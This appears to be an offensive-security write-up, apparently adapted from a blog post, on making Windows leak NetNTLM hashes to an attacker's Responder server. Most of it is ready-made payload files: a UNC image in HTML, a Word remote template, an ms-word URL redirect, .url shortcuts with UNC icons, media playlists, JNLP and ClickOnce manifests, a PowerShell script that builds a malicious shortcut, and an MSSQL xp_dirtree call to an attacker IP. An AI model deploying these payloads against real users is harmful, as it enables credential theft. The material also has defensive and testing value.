## Internet Explorer & Edge

While the `dir` command can be used to leak hashes, it is not very convenient method for an attacker. A more likely scenario would be if the attacker entices the victim to visit the attacker's website or open a specially crafted file. As is widely known, Internet Explorer can leak NetNTLM hashes to websites containing embedded content (eg, images, stylesheets) loaded from a UNC path. This also applies to Microsoft Edge, which can be abused in the same way. This can be tested using the following HTML:

**_[leak.htm](https://www.datocms-assets.com/21957/1592981084-leak.htm):_**

```html
<!DOCTYPE html>
<html>
	<img src="file://<responder ip>/leak/leak.png"/>
</html>
```

## Office

Another well-known attack is by abusing Office. Office documents can contain links to external content that when pointed to a network share can result in disclosing NetNTLM hashes. For example, a Word document can contain a link to a template file located on a share. The template file can be set via the `word\_rels\settings.xml.rels` file located in the `DOCX` file.

_**[word_rels\settings.xml.rels](https://www.datocms-assets.com/21957/1592981117-leak.docx):**_

```html
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
	<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file://<responder ip>/leak/Template.dotx" TargetMode="External"/>
</Relationships>
```

![](https://www.datocms-assets.com/21957/1592477905-wordntlmleaktemplate.png) 
_Figure 2: leak NetNTLM hashes using Word_

It should be noted that this particular trick doesn't work if the Word document is opened in Protected View. This is normally the case if the document is opened from a website or opened from an email message.

## Living off the land

If no mitigations have been applied, it is not very hard to trick Windows to leak hashes. Essentially any document format that allows loading of external files from UNC paths should be affected by this flaw. To get an idea how easy it is to find such methods, a number of them are listed below. This is by far an exhaustive list, it just demonstrates how prevalent this issue is. Of course an attacker still needs to entice the user into performing a certain action.

## URL handlers

Besides abusing files there are other ways to force applications to open files from (rogue) network shares. One such way is with the use of URL handlers. A large number of applications register custom URL schemes. For example, Word registers the `ms-word` URL scheme. This scheme accepts a path that can be used to cause Word to try to open a file from a UNC path. Consequently, the `ms-word` URL scheme can be used to steal NetNTLM hashes. Other URL handlers can be abused in a similar manner.

```html
<!DOCTYPE html>
<html>
	<script>
		location.href = 'ms-word:ofe|u|\\<responder ip>\leak\leak.docx';
	</script>
</html>
```

## Internet Shortcut

Another trick is to just create a shortcut to the rogue share. Windows has a special `URL` file type that is used to create shortcuts to webpages. A simple version looks something like this:

**_[leak.url](https://www.datocms-assets.com/21957/1592981144-leak.url):_**

```
[InternetShortcut]
URL=file://<responder ip>/leak/leak.html
```

It is possible to assign an icon to this shortcut. When Windows Explorer encounters a URL file it will automatically parse it to see if there is an icon associated to the shortcut. Setting the icon to an UNC path will cause Windows Explorer to try and load it, again leaking hashes. This happens when the user just browses to the folder containing the URL file. So if an attacker managers to drop a URL file in the user's download folder, hashes are leaked every time the user views the download folder in Explorer. Similar attacks are possible using other shortcut type of file formats, which is also useful with USB drops.

**_leak2.url:_**

```
[InternetShortcut]
URL=https://securify.nl
IconIndex=0
IconFile=\\<responder ip>\leak\leak.ico
```

## Windows Media Player

Media players tend to support many audio and video file formats and playlists. Playlists can be seen as a collection of links to external files, including files located on network shares. Naturally this can be abused to steal NetNTLM hashes. Windows Media Player is no exception, opening a specially crafted playlist in Windows Media Player can potentially disclose hashes to an attacker.

_**[leak.m3u](https://www.datocms-assets.com/21957/1592981177-leak.m3u):**_

```
#EXTM3U
#EXTINF:1337, Leak
\\<responder ip>\leak.mp3
```

_**[leak.asx](https://www.datocms-assets.com/21957/1592981202-leak.asx):**_

```html
<asx version="3.0">
	<title>Leak</title>
	<entry>
		<title></title>
		<ref href="file://<responder ip>/leak/leak.wma"/>
	</entry>
</asx>
```

_**[leak.wax]:**
```sh
https://10.8.3.12/test
file://\\10.8.3.12/steal/file
```
## Java Web Start

Many enterprise still use Java applications. There is a good chance that they also have Java Web Start enabled. Java Web Start allows users to start Java applications from the internet using a browser. A Java Web Start application is launched by opening a JNLP file. JNLP files are XML files that define how the application should be started. It also contains links to one or more JAR files. These JAR files could be located on network shares thus are a good target for leaking hashes.

_**[leak.jnlp](https://www.datocms-assets.com/21957/1592981769-leak.jnlp):**_

```html
<?xml version="1.0" encoding="UTF-8"?>
<jnlp spec="1.0+" codebase="" href="">
	<resources>
		<jar href="file://<responder ip>/leak/leak.jar"/>
	</resources>
	<application-desc/>
</jnlp>
```

It should be noted that while JNLP files can be opened from a browser they are block by Microsoft Outlook on Windows. JNLP files are allowed on Outlook for macOS though.

![](https://www.datocms-assets.com/21957/1592477933-outlookblocksjnlp.png) _Figure 3: JNLP files are blocked in Outlook_

## ClickOnce

.NET's counterpart to Java Web Start is named ClickOnce. It works in a similar manner, applications are started via a ClickOnce deployment manifest file. These files can also contain UNC paths, similar to Java Web Start. Remarkably, ClickOnce deployment manifests are not blocked by Outlook.

![](https://www.datocms-assets.com/21957/1592477936-outlookclickonceallowed.png) _Figure 4: ClickOnce deployment manifest files are not blocked in Outlook_

_**[leak.application](https://www.datocms-assets.com/21957/1592982308-leak.application):**_

```html
<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd" manifestVersion="1.0" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" xmlns="urn:schemas-microsoft-com:asm.v2" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xrml="urn:mpeg:mpeg21:2003:01-REL-R-NS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
	<assemblyIdentity name="Leak.app" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" xmlns="urn:schemas-microsoft-com:asm.v1" />
	<description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
	<deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
	<dependency>
		<dependentAssembly dependencyType="install" codebase="file://<responder ip>/leak/Leak.exe.manifest" size="32909">
			<assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
			<hash>
				<dsig:Transforms>
					<dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
				</dsig:Transforms>
				<dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />
				<dsig:DigestValue>ESZ11736AFIJnp6lKpFYCgjw4dU=</dsig:DigestValue>
			</hash>
		</dependentAssembly>
	</dependency>
</asmv1:assembly>
```

_**[Malicious ink (SMB)]:**
- Create a malicious that connect to our responder .
```sh
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Malicious.lnk")
$lnk.TargetPath = "\\10.8.3.12\@threat.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

_**[MSSQL]:**
```sh
EXEC master.sys.xp_dirtree '\\10.8.3.12\myshare',1,1
smbserver.py -smb2support share .
```

- Tool :
https://github.com/Greenwolf/ntlm_theft